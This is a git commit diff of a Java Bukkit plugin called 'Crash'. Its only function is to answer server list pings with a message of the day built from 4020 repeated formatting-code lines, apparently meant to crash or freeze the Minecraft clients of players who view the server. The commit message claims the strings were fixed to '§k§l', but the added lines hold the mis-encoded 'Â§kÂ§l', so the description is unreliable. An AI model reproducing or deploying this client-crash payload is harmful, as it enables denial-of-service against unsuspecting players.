d5e232b65547f913e5eea252a1a6c82a56d63a74
Ryūgū Rena (竜宮 レナ) <136980449+RyuguDev@users.noreply.github.com>
2024-10-20 13:12:57 +0200

    Fixxed Unicode-Strings "�k�l" with §k§l

--- src/de/Alex/Crash.java
+++ src/de/Alex/Crash.java
@@ -7,24 +7,21 @@ import org.bukkit.event.server.ServerListPingEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 
 public class Crash extends JavaPlugin implements Listener {
-	
-	public void onEnable() {	
-		Bukkit.getPluginManager().registerEvents(this, this);
-	}
-	
-	private String getCrashMotd() {
-		StringBuilder builder = new StringBuilder();
-		
-		for(int i = 0; i < 4020; i++) {
-			builder.append("§k§l\n");
-		}
-		
-		return builder.toString();
-	}
-	
-	@EventHandler
-	public void onListPing(ServerListPingEvent e) {
-			e.setMotd(getCrashMotd());
-	}
 
+    public void onEnable() {	
+        Bukkit.getPluginManager().registerEvents(this, this);
+    }
+	
+    private String getCrashMotd() {
+        StringBuilder builder = new StringBuilder();
+        for (int i = 0; i < 4020; i++) {
+            builder.append("Â§kÂ§l\n");
+        }
+        return builder.toString();
+    }
+	
+    @EventHandler
+    public void onListPing(ServerListPingEvent e) {
+        e.setMotd(getCrashMotd());
+    }
 }
